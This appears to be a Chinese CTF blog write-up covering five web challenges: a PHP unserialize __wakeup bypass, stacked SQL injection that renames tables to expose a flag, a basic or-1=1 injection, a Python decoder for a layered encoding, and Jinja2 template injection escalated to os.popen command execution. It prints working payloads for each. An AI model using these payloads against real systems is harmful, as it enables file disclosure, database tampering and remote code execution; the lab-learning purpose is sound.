# Web_php_unserialize

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e4375c3ff6eb4e8198e8de9de847f53f.png)

当通过$_GET['var']传入序列化数据时，会调用unserialize，触发魔术方法__wakeup和__destruct。
__destruct方法使用highlight_file($this->file)输出文件内容，若$file可控，可读取任意文件。
__wakeup 防御：若$file不为index.php，会被重置为index.php。可通过属性个数溢出绕过（序列化时声明的属性个数大于实际个数，__wakeup不会执行）。
正则检测：preg_match('/[oc]:\d+:/i', $var)禁止包含o:或c:开头的序列化字符串。可利用NULL 字节截断让正则匹配失败（PHP 中preg_match遇到 NULL 字节会提前终止匹配）。

构造：/index.php?var=?TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/27c8d76911c54316a110f353f206d56d.png)

# supersqli

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/118110e2f28744de8c9b919eeca0d16e.png)

看一下会输出什么

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/141e99134b8b430fa6911f8dd1cb02fb.png)

’1会报错

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c55eed2a847c4d45aab5434f1aebf674.png)

1';show databases -- #

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3f7621ce7e9743049a8b214e42a5bfdf.png)

1';show tables -- #

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a8356bff39624c8d844fd4859ed8e1a1.png)

1';show columns from `1919810931114514` -- #

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cec7d33363ba49e98921a436cf479600.png)

1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);-- #
1' or 1=1 #

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/54aae3c00e484f55bf760a606699d608.png)

# inget

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c9e546d43c514edcb2729d03a6c9dac6.png)

?id=1' or 1=1 -- #

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/73b03e8937a34570a8e297040ae48adb.png)

# web2

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a7e3bb1363794de48c9569e00ffed85a.png)

对密文进行 str_rot13 还原：由于 str_rot13 是双向变换，再次应用即可还原。
反转字符串：逆转加密时最后一步的 strrev。
Base64 解码：解开加密时的 base64_encode。
字符 ord 减 1：逆转加密时每个字符 ord+1 的操作。
再次反转字符串：逆转加密时第一步的 strrev。

```csharp
import base64
def python_decode(string):
    zimu = "abcdefghijklmnopqrstuvwxyz" 
    rot_13 ="" 
    for i in string: 
        if i.isdigit():
            rot_13 += i
        else:
            try:
                rot_13 += zimu[zimu.index(i)-13] 
            except:
                rot_13 += zimu[zimu.index(i.lower())-13].upper()
    fz = rot_13[::-1]
    base = base64.b64decode(fz)
    base = [chr(ord(i)-1) for i in base]
    fz = base[::-1]
    print "".join(fz)

python_decode("a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws")
```

结果：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}

# Web_python_template_injection

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/fda8c4dd860945379ec92c9ee205445b.png)

输入/{{7+7}}，测试存在模板注入

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d0fe1f63d93645ff9b9a473fc5383280.png)

/{{''.__class__}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3ab58f114dff42e89d5789d85591caa9.png)

/{{''.__class__.__mro__}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/801ae0c58ffe403ab69aeaa16d4ff1f5.png)

/{{''.__class__.__base__.__base__.__subclasses__()}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0c3814abd08143daa400958d7a852abe.png)

/{{''.__class__.__base__.__base__.__subclasses__()[168]}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6a72380a709a4197b05847d788aeed93.png)

/{{''.__class__.__base__.__base__.__subclasses__()[145].__init__.__globals__.__builtins__['eval']('__import__("os").popen("ls").read()')}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d964de1a14b5400bad12ac19d2ac874f.png)

/{{''.__class__.__base__.__base__.__subclasses__()[145].__init__.__globals__.__builtins__['eval']('__import__("os").popen("cat fl4g").read()')}}

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/fd402ab27ba64cd2a602560a91724ee0.png)
